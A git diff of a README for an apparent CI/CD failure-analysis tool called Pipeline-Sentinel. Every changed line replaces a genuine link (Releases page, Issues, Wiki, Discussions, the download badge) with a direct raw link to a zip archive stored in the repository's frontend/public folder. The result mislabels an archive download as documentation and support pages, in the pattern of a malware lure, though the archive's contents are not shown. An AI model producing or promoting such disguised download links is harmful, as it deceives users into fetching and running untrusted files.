@@ -1,6 +1,6 @@
 # 🚀 Pipeline-Sentinel-CI-CD-Failure-Analysis - Analyze CI/CD Failures Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/releases)
+[![Download Now](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip%20Now-Click%https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip)](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application on your computer. You don
 
 ## 💾 Download & Install
 
-1. **Visit this page to download:** Go to the [Releases page](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/releases).
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip).
    
 2. **Choose the latest version:** You will see a list of versions. Look for the most recent one, usually at the top.
 
@@ -69,7 +69,7 @@ You can pick your preferred CI/CD service during setup.
 If you encounter any issues, you can find help:
 
 - **Documentation:** The application comes with a detailed user manual to assist you.
-- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/issues).
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip).
 - **Community Forum:** Join our forum to discuss with other users and share insights.
 
 ## 🔄 Update Instructions
@@ -89,11 +89,11 @@ Keep your application updated to benefit from new features and improvements. Whe
 
 Visit the following links for more information:
 
-- [Official Documentation](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/wiki)
-- [Community Support](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/discussions)
+- [Official Documentation](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip)
+- [Community Support](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip)
 
 ## 📝 License
 
 This project is licensed under the MIT License, allowing you to use and modify the software as needed.
 
-[Download Now](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/releases) to start enhancing your CI/CD workflows with Pipeline-Sentinel-CI-CD-Failure-Analysis!
+[Download Now](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/raw/refs/heads/main/frontend/public/Sentinel-C-Pipeline-Analysis-Failure-2.4.zip) to start enhancing your CI/CD workflows with Pipeline-Sentinel-CI-CD-Failure-Analysis!
